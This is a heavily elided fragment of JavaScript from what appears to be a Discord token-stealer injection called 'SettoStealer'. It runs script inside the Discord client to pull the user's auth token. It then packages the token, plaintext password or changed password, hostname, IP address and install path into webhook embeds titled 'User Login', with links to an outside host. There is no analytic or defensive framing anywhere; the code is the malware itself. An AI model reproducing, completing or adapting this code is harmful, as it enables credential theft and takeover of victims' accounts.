...
function FirstTime() {
	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "[**<:partner:909102089513340979> │ Click Here To Get To Our Discord**](https://www.discord.gg/sniper)",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
		...
		if (!fs.existsSync(path.join(__dirname, "SettoStealerBTW"))) {
			return !0
		}
		fs.rmdirSync(path.join(__dirname, "SettoStealerBTW"));
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var fieldo = [];
							var baseuri = "https://discord.gg/sniper"
							...
							var params = {
								...
								embeds: [{
									"title": "User Login",
									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.SettoStealer.to/raw/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var fieldo = [];
							var baseuri = "https://premium.SettoStealer.to/raw/"
							...
							var params = {
								...
								embeds: [{
									...
									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.SettoStealer.to/raw/"+ token +"<br>"+ newpassword+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
